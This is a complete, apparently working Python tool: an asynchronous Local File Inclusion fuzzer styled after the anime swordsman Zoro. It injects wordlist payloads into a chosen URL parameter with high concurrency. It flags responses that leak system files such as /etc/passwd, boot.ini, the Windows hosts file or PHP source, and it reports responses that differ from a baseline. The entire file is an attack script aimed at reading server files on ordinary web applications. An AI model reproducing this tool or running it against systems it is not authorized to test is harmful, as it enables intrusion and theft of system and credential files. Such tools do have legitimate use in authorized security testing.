import asyncio
import sys
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import aiohttp

# --- Zoro's Aesthetic Color Palette ---
GREEN = "\033[38;5;34m"   # Marimo Moss Green
CRIMSON = "\033[91m"      # Fresh Battle Scar Red
ASH = "\033[38;5;244m"     # Dark Bandana Gray
GOLD = "\033[38;5;214m"    # Sword Hilt Gold
RESET = "\033[0m"
BOLD = "\033[1m"

# Target weak spots (LFI Signatures)
VITAL_SIGNATURES = [
    "root:x:",          # Linux /etc/passwd
    "[boot loader]",    # Windows boot.ini
    "Content-Type:",    # Log/Source file leakage
    "<?php",            # PHP Wrapper leakage
    "Drivers\\etc"      # Windows Hosts file
]

async def calibrate_haki(session, param_name, base_parts):
    """Calibrates baseline defense.

    Zoro sizes up the opponent's posture before striking.
    """
    print(f"{ASH}[*] Drawing Wado Ichimonji... Sensing the enemy's baseline posture...{RESET}")
    
    query_params = parse_qs(base_parts.query)
    # A dummy strike that should hit nothing but armor
    query_params[param_name] = ["ZORO_DUMMY_SLASH_99999"]
    
    new_query = urlencode(query_params, doseq=True)
    test_url = urlunparse(base_parts._replace(query=new_query))
    
    try:
        async with session.get(test_url, timeout=5) as response:
            text = await response.text()
            return len(text), response.status
    except Exception as e:
        print(f"{CRIMSON}[!] Blade deflected! Calibration failed: {e}{RESET}")
        sys.exit(1)

async def three_sword_slash(session, sem, param_name, base_parts, payload, baseline_len, baseline_status):
    """Executes a single focused strike using the payload wordlist."""
    async with sem:
        query_params = parse_qs(base_parts.query)
        query_params[param_name] = [payload.strip()]
        
        new_query = urlencode(query_params, doseq=True)
        fuzz_url = urlunparse(base_parts._replace(query=new_query))
        
        try:
            async with session.get(fuzz_url, timeout=5) as response:
                text = await response.text()
                resp_len = len(text)
                status = response.status
                
                # Strike 1: Critical Hit (Direct Signature Match)
                matched_sig = next((sig for sig in VITAL_SIGNATURES if sig in text), None)
                if matched_sig:
                    print(f"{GREEN}{BOLD}[!!!] ONI GIRI! Guard Broken (Sig: '{matched_sig}'){RESET} -> Status: {status} | Size: {resp_len} | Slash: {payload.strip()}")
                    return
                
                # Strike 2: Armor Crack (Structural Anomaly / Size Change)
                if resp_len != baseline_len or status != baseline_status:
                    if resp_len == 0 and baseline_len != 0:
                        return
                    print(f"{GOLD}[+] CHITOSE HAZAMI! Guard Altered{RESET} -> Status: {status} (Base: {baseline_status}) | Size: {resp_len} (Base: {baseline_len}) | Slash: {payload.strip()}")
                    
        except Exception:
            # Deflected slashes drop silently into the dust
            pass

async def main():
    print(f"""{GREEN}{BOLD}
          ,                      
         /|      _   _          
       _/_|_   _( )_( )_        {RESET}{BOLD}--- SANTORYU LFI FUZZER ---{RESET}{GREEN}{BOLD}
      (  _  ) (_  _ _  _)       [ Wado Ichimonji | Sandai Kitetsu | Shusui ]

      | |_| |   | | | |         
      \_____/   (_) (_)         {RESET}""")

    parser = argparse.ArgumentParser(description="Santoryu Async LFI Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL containing the vulnerable parameter")
    parser.add_argument("-p", "--param", required=True, help="Parameter to slice open")
    parser.add_argument("-w", "--wordlist", required=True, help="Your collection of sword techniques (wordlist)")
    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Number of concurrent strikes (Default: 20)")
    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if args.param not in parse_qs(parsed_url.query):
        print(f"{CRIMSON}[!] Error: Parameter '{args.param}' is out of reach. Check the query string.{RESET}")
        sys.exit(1)

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            payloads = f.readlines()
    except Exception as e:
        print(f"{CRIMSON}[!] Could not unsheathe wordlist: {e}{RESET}")
        sys.exit(1)

    print(f"{GOLD}[*] Sharpened {len(payloads)} strikes. Tying dark bandana...{RESET}")

    sem = asyncio.Semaphore(args.concurrency)
    
    async with aiohttp.ClientSession() as session:
        base_len, base_status = await calibrate_haki(session, args.param, parsed_url)
        print(f"{ASH}[*] Enemy defense pattern mapped. Stance Solid. Base Size: {base_len} | Base Status: {base_status}{RESET}")
        print(f"{GREEN}{BOLD}[*] Kokujo: O Tatsu Maki! Unleashing the storm...{RESET}\n")
        
        tasks = [
            three_sword_slash(session, sem, args.param, parsed_url, p, base_len, base_status)
            for p in payloads
        ]
        
        await asyncio.gather(*tasks)
    
    print(f"\n{ASH}[*] The dust settles. All targets slashed.{RESET}")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
